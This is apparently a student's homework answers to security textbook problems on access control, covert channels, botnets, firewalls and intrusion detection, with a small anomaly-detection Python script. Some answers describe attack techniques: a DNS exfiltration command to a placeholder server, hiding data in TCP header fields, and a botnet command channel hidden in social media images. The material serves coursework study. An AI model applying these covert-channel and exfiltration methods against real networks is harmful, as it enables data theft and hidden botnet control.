Chapter 8
==============================

> Do problems 4, 7, 8, 10, 13, 19, 28, 32, 36, 40 from chapter 8 (1 pt/problem)

## 4

> Capabilities allow delegation
> A. How to do this with ACLs
> B. A delegates to B to C to D. How's this done in capabilities vs ACLs?
> C. Is ACL or capabilities better for delegation

### A

Instead of allowing permission for the user to do something as in the capabilities model, the higher privilege user would act on behalf of the lower privilege one in ACL.

### B

In capabilities, Dave would have a capability from Charlie, who got it from Bob, who got it from Alice. The capability would be wrapped by each user when they issue it, along with the some other abilities like revoking it.

ACL on the other hand would have each user act on behalf of the other, going up the permission chain. Dave would request Charlie to act on his behalf, and request the same of Bob, then request Alice.

Capabilities are much easier because it can be verified who is acting on behalf of who, and thus solves security problems such as the confused deputy. With ACL, the higher authority is essentially a proxy, masking the original user.

### C

While capabilities has much better features, it's harder to implement and has problems with scaling. So capabilities would be the better option in general, but ACL is better for simplicity in implementing.

## 7

> What is "need to know" and how do compartments help

The need to know principle is where people are given minimal information necessary. This prevent information leaks and other confidentiality issues due to people gaining information they shouldn't have, or is otherwise harmful.

Compartments allows "horizontal" movement in addition to the "vertical" unclassified, secret, and top secret classifications. This is also akin to groups or projects within a larger group.

## 8

> Classified env with MLS, you have clearance
> A. Covert channel using UDP
> B. Minimizing covert channel from part A while not cutting off network entirely

### A

Send DNS request, querying the exfiltration server for a domain containing the data to exfiltrate, i.e. `dig @notarealdnsserver secretdata.com`.

### B

A trusted DNS server is mandated across the environment, and DNS requests elsewhere are blocked.

## 10

> Covert channels
> A. Using a print queue, and estimated capacity
> B. Using TCP

### A

Data can be "hidden" in the print job's metadata like file name, or the existence of a print job in the queue can act as binary. The first option can probably transmit more than a dozen bits per second, the is probably capable of about a bit per second.

### B

Numerous opportunities exist. Since the sender chooses a port number, the source port can hide around a byte. Various flags and reserved bits can be used. Also the sequence number (4 whole bytes!) can be used if the source address in the IP stack is changed. This has the additional benefit of utilizing an unknowing third party to bounce the packets off of, instead of directly contacting a server you control.

## 13

> Botnet with central C&C server
> A. What is IRC and why would it be useful for controlling?
> B. Why would a covert channel be useful for controlling a botnet?
> C. Design a covert channel for controlling a botnet

### A

IRC is a messaging protocol. It's simple, it's on every operating system, it's scalable, and was very popular when the Internet became popular too, all of which make it a good botnet C&C protocol.

### B

Covert channels would allow a compromised machine (zombie) to maintain the impression that it's not compromised, because the owner would pass off the C&C traffic as normal background noise, or not even find it at all.

### C

Upload pictures to a social media site with commands embedded, and the zombie machines would regularly monitor that social media page or account for updates. A short and simple program can parse the image for data and decode it, turning it into commands.

## 19

> CAPTCHAs
> A. Real world example and how it works
> B. In part A, what would be available to attacker

### A

Google recently came out with a CAPTCHA that shows a random image, and you select parts of it that match some prompt or subject. Presumable someone previously identified the solutions so the servers at Google know what the answers are. The responses you give are compared to that answer, and you may proceed if it's within some error bound.

### B

The attacker would probably be able to eventually gather all prompts the CAPTCHA would ask for, but the set of images seems to be almost limitless. They're basically cropped parts of Google's Street View.

## 28

> Packet filter firewall that prevents ACK scan by blocking RST
> A. Drawbacks
> B. Could TCP ACK scan be modified to work

### A

This essentially breaks down TCP because RST packets not triggered by a scan would get blocked, and broken connections would proceed while the client behind the firewall can't figure out why the bad connection isn't being reset.

### B

ACK scans might not work, but different scanning methods like SYN scans would work perfectly fine.

## 32

> Incoming packets are encrypted, and only sender/receiver can decrypt. Which firewall will work here?

If encrypted similar to SSL/TLS, then payload data is encrypted but TCP/IP headers are not. Thus, anything at the network level will be visible, but application level will require SSL stripping or other MitM techniques.

Thus, if the problem is detecting network level issues like port scanning or restricted addresses/ports being used, then any of the filters (packet, stateful packet, and application proxy) would be fine. If the problem is detecting application level issues like restricted services being used, or viruses being downloaded, then nothing will work because that's encrypted.

## 36

> IDS: signature and anomaly based
> A. Advantages of signature based
> B. Advantages of anomaly based
> C. Why is anomaly harder

### A

Signature based is essentially a dictionary lookup. Therefore it's very fast and reliable, as it simply matches based on things like checksums.

### B

Anomaly based finds intrusions and malicious activity in general, so it can find intrusions or behavior that has variations, or haven't been seen before.

### C

Anomaly based is has several important issues. It requires a baseline that is accurate, it has to allow slight variations from the normal, and has to account for a changing network landscape (new users and permissions, new software and protocols being used, adding and removing hardware from network). And from the start, it needs a good model for telling what's malicious or not.

## 40

> For table:
> 
> | H0     | H1     | H2     | H3     |
> | ------ | ------ | ------ | ------ |
> | 0.10   | 0.38   | 0.364  | 0.156  |
> 
> File use time statistics are A0 = 0.05, A1 = 0.25, A2 = 0.25, A3 = 0.45
> A. Is this normal for Alice
> B. Compute updated H values

### A

No. The sum is 0.118832, over the threshold of 0.1.

### B

| H0     | H1     | H2     | H3     |
| ------ | ------ | ------ | ------ |
| 0.09   | 0.354  | 0.3412 | 0.2148 |

### Program

```python
from decimal import Decimal as Dec

baseline = [0.1, 0.38, 0.364, 0.156]
stats = [0.05, 0.25, 0.25, 0.45]
threshold = 0.1
s = 0

for h, a in zip(baseline, stats):
    s += (h - a) ** 2

print('sum of {}'.format(s))
if s > threshold:
    print('abnormal behavior!')
else:
    print('this is normal')

newavg = []
for h, a in zip(baseline, stats):
    new = Dec('0.2') * Dec(str(a)) + Dec('0.8') * Dec(str(h))
    new = float(new)
    print(new)
    newavg.append(new)

baseline = newavg
print(baseline)
```
